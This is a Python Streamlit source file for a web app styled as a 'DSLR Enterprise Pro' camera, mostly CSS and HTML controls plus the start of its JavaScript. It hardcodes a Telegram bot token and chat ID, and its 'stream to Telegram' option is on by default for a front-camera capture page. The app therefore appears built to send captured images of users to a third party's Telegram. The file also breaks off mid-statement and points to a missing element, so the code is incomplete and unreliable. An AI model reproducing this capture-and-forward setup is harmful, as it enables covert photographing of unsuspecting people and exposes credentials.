import streamlit as st
import streamlit.components.v1 as components

# ==============================================================================
# MASTER DSLR STUDIO // ULTIMATE FLAGSHIP ENTERPRISE PRO v30.0
# CONFIGURATION & TELEGRAM SYNC
# ==============================================================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="DSLR Enterprise Pro v30.0",
    page_icon="📷",
    layout="wide", # Menggunakan wide layout untuk ruang kontrol Pro
    initial_sidebar_state="collapsed"
)

# Inisialisasi Session State untuk Menyimpan Data antar Rerun Streamlit
if 'captured_images' not in st.session_state:
    st.session_state['captured_images'] = []
if 'raw_data' not in st.session_state:
    st.session_state['raw_data'] = {} # Menyimpan base64 dan metadata

# ==============================================================================
# CSS STYLING (PRO GRADE GLASSMORPHISM + DARK THEME)
# ==============================================================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500;700&family=Cinzel:wght@600;700&family=Inter:wght@300;400;500;600&display=swap');
    
    :root {
        --bg-dark: #05070a;
        --bg-panel: rgba(20, 30, 45, 0.6);
        --accent-cyan: #00f2ff;
        --accent-red: #ff3355;
        --text-main: #e0e6ed;
        --text-muted: #94a3b8;
        --glass-blur: blur(25px) saturate(180%);
        --border-glass: 1px solid rgba(255, 255, 255, 0.08);
    }

    .stApp {
        background-color: var(--bg-dark);
        color: var(--text-main);
        font-family: 'Inter', sans-serif;
        overflow: hidden;
    }

    /* === GLOBAL UTILITIES === */
    .pro-font { font-family: 'Roboto+Mono', monospace; }
    .cinzel-font { font-family: 'Cinzel', serif; }
    .text-cyan { color: var(--accent-cyan); }
    .text-red { color: var(--accent-red); }
    .bold { font-weight: 700; }

    /* === MAIN LAYOUT === */
    .master-container {
        display: flex;
        flex-direction: column;
        height: 95vh;
        max-width: 100vw;
        margin: 0 auto;
        padding: 10px;
    }

    /* === VIEWFIELDER AREA === */
    .viewfinder-section {
        flex: 1;
        position: relative;
        background: #000;
        border-radius: 12px;
        border: 2px solid rgba(255,255,255,0.1);
        overflow: hidden;
        display: flex;
        justify-content: center;
        align-items: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }

    #video-stream-pro {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: scaleX(-1); /* Mirror untuk front camera */
    }

    /* === PRO OVERLAYS (HUD) === */
    .pro-overlay { position: absolute; color: white; font-family: 'Roboto+Mono', monospace; pointer-events: none; }
    
    .hud-top { top: 10px; left: 10px; right: 10px; display: flex; justify-content: space-between; font-size: 9px; }
    .hud-bottom { bottom: 10px; left: 10px; right: 10px; display: flex; justify-content: space-between; font-size: 10px; align-items: flex-end; }
    
    .telemetry-box { background: rgba(0,0,0,0.5); padding: 2px 6px; border-radius: 4px; backdrop-filter: blur(2px); border: 1px solid rgba(255,255,255,0.1); }
    
    /* Focus Peaking Overlay */
    #peaking-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; mix-blend-mode: screen; opacity: 0; }
    
    /* Histogram / Waveform placeholder */
    #histogram-placeholder { position: absolute; bottom: 40px; right: 10px; width: 100px; height: 60px; background: rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.1); border-radius: 4px; display: none;}
    
    /* Zebra stripes for overexposure */
    #zebra-canvas { position: absolute; top:0; left:0; width:100%; height:100%; pointer-events: none; opacity: 0; }

    /* Countdown */
    #countdown-pro { font-family: 'Cinzel', serif; font-size: 80px; color: white; text-shadow: 0 0 20px rgba(255,255,255,0.8); display: none; }
    
    /* Flash */
    #flash-pro { position: absolute; top:0; left:0; width:100%; height:100%; background: white; opacity: 0; pointer-events: none; }

    /* === CONTROL PANELS === */
    .control-section {
        height: 220px; /* Fixed height for controls */
        margin-top: 10px;
        background: var(--bg-panel);
        backdrop-filter: var(--glass-blur);
        -webkit-backdrop-filter: var(--glass-blur);
        border-radius: 12px;
        border: var(--border-glass);
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }

    /* Top Pro Bar (Shutter, Aperture, ISO) */
    .pro-settings-bar {
        height: 40px;
        background: rgba(0,0,0,0.2);
        border-bottom: var(--border-glass);
        display: flex;
        justify-content: space-around;
        align-items: center;
        padding: 0 10px;
    }

    .setting-dial {
        font-family: 'Roboto+Mono', monospace;
        font-size: 11px;
        color: var(--text-muted);
        cursor: pointer;
        padding: 2px 8px;
        border-radius: 4px;
        transition: all 0.2s;
    }
    .setting-dial:hover, .setting-dial.active {
        background: rgba(255,255,255,0.1);
        color: var(--accent-cyan);
    }
    .setting-dial .value { color: var(--text-main); font-weight: 500; }

    /* Main Control Area (Tabs + Shutter) */
    .main-controls {
        flex: 1;
        display: flex;
        position: relative;
    }

    /* Left Tab Menu */
    .pro-tabs {
        width: 100px;
        background: rgba(0,0,0,0.1);
        border-right: var(--border-glass);
        display: flex;
        flex-direction: column;
        padding: 10px 0;
    }
    .pro-tab-btn {
        font-family: 'Inter', sans-serif;
        font-size: 10px;
        color: var(--text-muted);
        padding: 8px 15px;
        cursor: pointer;
        border-left: 2px solid transparent;
        transition: all 0.2s;
    }
    .pro-tab-btn:hover { color: var(--text-main); background: rgba(255,255,255,0.05); }
    .pro-tab-btn.active {
        color: var(--accent-cyan);
        border-left: 2px solid var(--accent-cyan);
        background: rgba(0, 242, 255, 0.05);
        font-weight: 500;
    }

    /* Right Tab Content */
    .pro-tab-content {
        flex: 1;
        padding: 15px;
        overflow-y: auto;
    }

    .control-group { margin-bottom: 15px; }
    .control-label {
        font-family: 'Inter', sans-serif;
        font-size: 9px;
        color: var(--text-muted);
        text-transform: uppercase;
        letter-spacing: 1px;
        margin-bottom: 5px;
        display: block;
    }

    /* Button Grid for Filters/Presets */
    .btn-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
        gap: 6px;
    }
    .pro-choice-btn {
        background: rgba(255,255,255,0.03);
        border: var(--border-glass);
        color: var(--text-muted);
        padding: 6px;
        border-radius: 6px;
        font-family: 'Roboto+Mono', monospace;
        font-size: 9px;
        text-align: center;
        cursor: pointer;
        transition: all 0.2s;
    }
    .pro-choice-btn:hover { background: rgba(255,255,255,0.1); color: var(--text-main); }
    .pro-choice-btn.active {
        background: rgba(0, 242, 255, 0.15);
        border-color: var(--accent-cyan);
        color: var(--accent-cyan);
        font-weight: 600;
    }

    /* Sliders */
    .pro-slider-group { margin-bottom: 10px; }
    .pro-slider-group label {
        font-family: 'Roboto+Mono', monospace;
        font-size: 8px;
        color: var(--text-muted);
        display: flex;
        justify-content: space-between;
        margin-bottom: 2px;
    }
    input[type=range].pro-range {
        -webkit-appearance: none;
        width: 100%;
        height: 3px;
        background: rgba(255,255,255,0.1);
        border-radius: 2px;
        outline: none;
    }
    input[type=range].pro-range::-webkit-slider-thumb {
        -webkit-appearance: none;
        appearance: none;
        width: 12px;
        height: 12px;
        background: var(--accent-cyan);
        border-radius: 50%;
        cursor: pointer;
        box-shadow: 0 0 10px var(--accent-cyan);
    }
    
    /* Toggle Switch (e.g., Pro Mode, Peaking) */
    .switch-group { display: flex; justify-content: space-between; align-items: center; font-size: 9px; color: var(--text-muted); margin-bottom: 10px;}
    .switch { position: relative; display: inline-block; width: 30px; height: 16px; }
    .switch input { opacity: 0; width: 0; height: 0; }
    .slider-switch {
        position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
        background-color: rgba(255,255,255,0.1); transition: .4s; border-radius: 16px;
        border: var(--border-glass);
    }
    .slider-switch:before {
        position: absolute; content: ""; height: 10px; width: 10px; left: 3px; bottom: 3px;
        background-color: var(--text-muted); transition: .4s; border-radius: 50%;
    }
    input:checked + .slider-switch { background-color: rgba(0, 242, 255, 0.2); border-color: var(--accent-cyan); }
    input:checked + .slider-switch:before { background-color: var(--accent-cyan); transform: translateX(14px); box-shadow: 0 0 5px var(--accent-cyan); }

    /* Center Shutter Button */
    .shutter-wrapper {
        position: absolute;
        bottom: -30px; /* Setengah keluar */
        left: 50%;
        transform: translateX(-50%);
        width: 70px;
        height: 70px;
        background: rgba(10, 15, 25, 0.9);
        border: var(--border-glass);
        backdrop-filter: blur(10px);
        border-radius: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
        box-shadow: 0 0 20px rgba(0,0,0,0.5);
        z-index: 50;
        cursor: pointer;
        transition: all 0.2s ease;
    }
    .shutter-wrapper:hover { background: rgba(20, 30, 45, 0.9); }
    .shutter-wrapper:active { transform: translateX(-50%) scale(0.9); }
    
    #shutter-btn-inner {
        width: 50px;
        height: 50px;
        background: radial-gradient(circle, #fff 0%, #ddd 100%);
        border-radius: 50%;
        border: 2px solid #fff;
        box-shadow: 0 0 10px rgba(255,255,255,0.5);
        transition: all 0.1s;
    }
    .shutter-wrapper:active #shutter-btn-inner { background: radial-gradient(circle, #eee 0%, #ccc 100%); }

    /* Recording indicator (Video mode) */
    #rec-indicator {
        position: absolute;
        top: 20px;
        right: 40px;
        width: 10px;
        height: 10px;
        background: var(--accent-red);
        border-radius: 50%;
        display: none;
        animation: blink 1s infinite;
    }
    @keyframes blink { 50% { opacity: 0; } }

    /* Modal Overlay for Fullscreen Gallery */
    #gallery-modal {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.95); backdrop-filter: blur(10px);
        z-index: 200; display: none; padding: 20px; overflow-y: auto;
    }
    #gallery-close { position: absolute; top: 15px; right: 20px; color: white; font-size: 20px; cursor: pointer; }
    .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
    .gallery-item { position: relative; border-radius: 8px; overflow: hidden; cursor: pointer; }
    .gallery-item img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.2s; }
    .gallery-item:hover img { transform: scale(1.05); }
    .gallery-item-meta {
        position: absolute; bottom: 0; left: 0; width: 100%;
        background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
        padding: 5px; font-size: 8px; color: var(--text-muted);
    }
    </style>
""", unsafe_allow_html=True)

# ==============================================================================
# PYTHON UI LOGIC (STREAMLIT)
# ==============================================================================

# Layout Utama Menggunakan Grid Custom agar responsif di Mobile
with st.container():
    st.markdown('<div class="master-container">', unsafe_allow_html=True)
    
    # Row 1: Viewfinder Section
    st.markdown("""
        <div class="viewfinder-section">
            <video id="video-stream-pro" autoplay playsinline></video>
            <canvas id="peaking-canvas"></canvas>
            <canvas id="zebra-canvas"></canvas>
            <div id="histogram-placeholder"></div>
            <div id="rec-indicator"></div>
            <div id="flash-pro"></div>
            <center><div id="countdown-pro">3</div></center>

            <!-- Pro Overlays HUD -->
            <div class="pro-overlay hud-top">
                <div class="telemetry-box cinzel-font bold" style="color: var(--accent-cyan);">DSLR ENTERPRISE PRO</div>
                <div class="telemetry-box pro-font" id="hud-mode-display">MODE: AUTO</div>
                <div class="telemetry-box pro-font" id="hud-battery-display">BATT: 98%</div>
            </div>

            <div class="pro-overlay hud-bottom">
                <div style="display:flex; gap: 5px;">
                    <div class="telemetry-box pro-font" id="hud-ss">SS: 1/250</div>
                    <div class="telemetry-box pro-font" id="hud-ap">F: 2.8</div>
                    <div class="telemetry-box pro-font" id="hud-iso">ISO: 400</div>
                    <div class="telemetry-box pro-font" id="hud-ev">EV: 0.0</div>
                </div>
                <div style="display:flex; gap: 5px; align-items: flex-end;">
                    <div class="telemetry-box pro-font" id="hud-wb">WB: AWB</div>
                    <div class="telemetry-box pro-font" id="hud-drive">DRIVE: S</div>
                    <div class="telemetry-box pro-font" id="hud-quality">JPG-L</div>
                </div>
            </div>
        </div>
    """, unsafe_allow_html=True)

    # Row 2: Control Section (Settings Bar + Main Controls)
    st.markdown("""
        <div class="control-section">
            <!-- Top Settings Bar (Visible in both modes) -->
            <div class="pro-settings-bar pro-font">
                <div class="setting-dial active" onclick="openTabFromDial('exposure')" id="dial-exp">
                    SS <span class="value" id="dial-ss-val">1/250</span>
                </div>
                <div class="setting-dial" onclick="openTabFromDial('exposure')" id="dial-ap">
                    F <span class="value" id="dial-ap-val">2.8</span>
                </div>
                <div class="setting-dial" onclick="openTabFromDial('exposure')" id="dial-iso">
                    ISO <span class="value" id="dial-iso-val">400</span>
                </div>
                <div class="setting-dial" onclick="openTabFromDial('wb')" id="dial-wb">
                    WB <span class="value" id="dial-wb-val">AWB</span>
                </div>
                <div class="setting-dial" onclick="openTabFromDial('focus')" id="dial-focus">
                    AF <span class="value" id="dial-focus-val">S</span>
                </div>
                <button onclick="toggleProMode()" class="ds-btn-glass pro-font" id="btn-pro-mode" style="font-size: 8px; padding: 2px 6px;">AUTO</button>
            </div>

            <!-- Main Controls Area (Tabs) -->
            <div class="main-controls">
                <!-- Center Shutter Button (Floats above) -->
                <div class="shutter-wrapper" id="shutterTriggerPro">
                    <div id="shutter-btn-inner"></div>
                </div>

                <!-- Left Tabs -->
                <div class="pro-tabs pro-font">
                    <div class="pro-tab-btn active" onclick="switchProTab('camera', this)" id="tab-btn-camera">CAMERA</div>
                    <div class="pro-tab-btn" onclick="switchProTab('exposure', this)" id="tab-btn-exp">EXPOSURE</div>
                    <div class="pro-tab-btn" onclick="switchProTab('focus', this)" id="tab-btn-focus">FOCUS</div>
                    <div class="pro-tab-btn" onclick="switchProTab('image', this)" id="tab-btn-image">IMAGE</div>
                    <div class="pro-tab-btn" onclick="switchProTab('system', this)" id="tab-btn-system">SYSTEM</div>
                </div>

                <!-- Right Content -->
                <div class="pro-tab-content">
                    <!-- === TAB CAMERA (Basic/Common) === -->
                    <div id="pro-tab-camera" class="tab-content-active">
                        <div class="btn-grid">
                            <button onclick="setDriveMode(this, 'S')" class="pro-choice-btn active" id="drive-S">SINGLE</button>
                            <button onclick="setDriveMode(this, 'C')" class="pro-choice-btn" id="drive-C">BURST</button>
                            <button onclick="setDriveMode(this, 'T2')" class="pro-choice-btn" id="drive-T2">TIMER 2s</button>
                            <button onclick="setDriveMode(this, 'T10')" class="pro-choice-btn" id="drive-T10">TIMER 10s</button>
                        </div>
                        <div style="margin-top:10px;" class="btn-grid">
                            <button onclick="setCaptureMode(this, 'PHOTO')" class="pro-choice-btn active" id="mode-photo">PHOTO</button>
                            <button onclick="setCaptureMode(this, 'VIDEO')" class="pro-choice-btn" id="mode-video">VIDEO</button>
                        </div>
                        <div style="margin-top:10px; display:flex; gap:10px;">
                             <button onclick="switchCameraPro()" class="ds-btn-glass pro-font" style="width:100%;">🔄 SWITCH CAMERA</button>
                        </div>
                    </div>

                    <!-- === TAB EXPOSURE (Pro) === -->
                    <div id="pro-tab-exposure" style="display: none;">
                        <div class="switch-group">
                            <span>PRO MODE (Manual)</span>
                            <label class="switch">
                                <input type="checkbox" id="chk-pro-mode-switch" onchange="toggleProModeSwitch()">
                                <span class="slider-switch"></span>
                            </label>
                        </div>
                        <div id="pro-exposure-controls" style="opacity: 0.5; pointer-events: none;">
                            <div class="pro-slider-group">
                                <label>SHUTTER SPEED <span id="val-ss">1/250</span></label>
                                <input type="range" class="pro-range" id="slider-ss" min="0" max="46" value="23" oninput="applyProSettings()">
                            </div>
                            <div class="pro-slider-group">
                                <label>APERTURE (Sim) <span id="val-ap">f/2.8</span></label>
                                <input type="range" class="pro-range" id="slider-ap" min="0" max="10" value="4" oninput="applyProSettings()">
                            </div>
                            <div class="pro-slider-group">
                                <label>ISO <span id="val-iso">400</span></label>
                                <input type="range" class="pro-range" id="slider-iso" min="0" max="8" value="3" oninput="applyProSettings()">
                            </div>
                            <div class="pro-slider-group">
                                <label>EXPOSURE COMPENSATION <span id="val-ev">0.0</span></label>
                                <input type="range" class="pro-range" id="slider-ev" min="-20" max="20" value="0" step="1" oninput="applyProSettings()">
                            </div>
                        </div>
                    </div>

                    <!-- === TAB FOCUS (Pro) === -->
                    <div id="pro-tab-focus" style="display: none;">
                        <div class="switch-group">
                            <span>FOCUS PEAKING</span>
                            <label class="switch">
                                <input type="checkbox" id="chk-peaking" onchange="togglePeaking()">
                                <span class="slider-switch"></span>
                            </label>
                        </div>
                         <div class="switch-group">
                            <span>ZEBRA PATTERNS</span>
                            <label class="switch">
                                <input type="checkbox" id="chk-zebra" onchange="toggleZebra()">
                                <span class="slider-switch"></span>
                            </label>
                        </div>
                        <div class="pro-slider-group">
                            <label>MANUAL FOCUS <span id="val-mf">AF</span></label>
                            <input type="range" class="pro-range" id="slider-mf" min="0" max="100" value="0" oninput="applyFocusManual()">
                        </div>
                    </div>

                    <!-- === TAB IMAGE (Pro) === -->
                    <div id="pro-tab-image" style="display: none;">
                        <div class="control-group">
                            <span class="control-label">WHITE BALANCE (WB)</span>
                            <div class="btn-grid" style="font-size: 9px;">
                                <button onclick="setWB(this, 'AWB')" class="pro-choice-btn active" id="wb-AWB">AWB</button>
                                <button onclick="setWB(this, 'Daylight')" class="pro-choice-btn" id="wb-Daylight">Daylght</button>
                                <button onclick="setWB(this, 'Cloudy')" class="pro-choice-btn" id="wb-Cloudy">Cloudy</button>
                                <button onclick="setWB(this, 'Tungsten')" class="pro-choice-btn" id="wb-Tungsten">Tungstn</button>
                                <button onclick="setWB(this, 'Fluorescent')" class="pro-choice-btn" id="wb-Fluorescent">Fluor</button>
                                <button onclick="setWB(this, 'Flash')" class="pro-choice-btn" id="wb-Flash">Flash</button>
                                <button onclick="setWB(this, 'Shade')" class="pro-choice-btn" id="wb-Shade">Shade</button>
                                <button onclick="setWB(this, 'Kelvin')" class="pro-choice-btn" id="wb-Kelvin">Kelvin</button>
                            </div>
                            <div class="pro-slider-group" id="kelvin-slider-group" style="display: none; margin-top: 10px;">
                                <label>KELVIN TEMP <span id="val-kelvin">5600K</span></label>
                                <input type="range" class="pro-range" id="slider-kelvin" min="2000" max="10000" value="5600" step="100" oninput="applyProSettings()">
                            </div>
                        </div>
                        <div class="control-group">
                            <span class="control-label">OUTPUT FORMAT</span>
                            <div class="btn-grid">
                                <button onclick="setFormat(this, 'JPG')" class="pro-choice-btn active" id="fmt-JPG">JPG FINE</button>
                                <button onclick="setFormat(this, 'DNG')" class="pro-choice-btn" id="fmt-DNG">JPG+DNG RAW</button>
                                <button onclick="setFormat(this, 'RAW')" class="pro-choice-btn" id="fmt-RAW">RAW ONLY</button>
                            </div>
                        </div>
                    </div>

                    <!-- === TAB SYSTEM (Pro) === -->
                    <div id="pro-tab-system" style="display: none;">
                        <button onclick="openGalleryModal()" class="ds-btn-glass pro-font" style="width:100%; margin-bottom: 10px;">📂 OPEN GALLERY (Session)</button>
                        <div class="switch-group">
                            <span>STREAM TO TELEGRAM</span>
                            <label class="switch">
                                <input type="checkbox" id="chk-tg-sync" checked>
                                <span class="slider-switch"></span>
                            </label>
                        </div>
                        <div style="text-align:center; color: var(--text-muted); font-size:8px; margin-top: 20px;">
                            DSLR Enterprise Pro v30.0 // Build 20241027<br/>
                            Optimized for WebRTC 4K/8K Stream
                        </div>
                    </div>
                </div>
            </div>
        </div>
    """, unsafe_allow_html=True)

    # Row 3: Hidden Gallery Modal
    st.markdown("""
        <div id="gallery-modal">
            <div id="gallery-close" onclick="closeGalleryModal()">✕</div>
            <h3 class="cinzel-font" style="color:white; text-align:center; margin-bottom:20px;">CAPTURE SESSION GALLERY</h3>
            <div class="gallery-grid" id="gallery-container-pro">
                <!-- Items inserted via JS -->
            </div>
        </div>
    """, unsafe_allow_html=True)

    st.markdown('</div>', unsafe_allow_html=True) # End master-container

# ==============================================================================
# JAVASCRIPT LOGIC (The Core of the Camera Engine)
# ==============================================================================
components.html(f"""
    <script>
    // --- CONSTANTS & STATE ---
    const video = document.getElementById('video-stream-pro');
    const canvas = document.getElementById('vault-canvas-glass'); // reused ID
    const recIndicator = document.getElementById('rec-indicator');
    const flashOverlay = document.getElementById('flash-pro');
    const countdownDisplay = document.getElementById('countdown-pro');
    
    let stream = null;
    let facingMode = "user"; // 'user' or 'environment'
    let isProMode = false;
    let captureMode
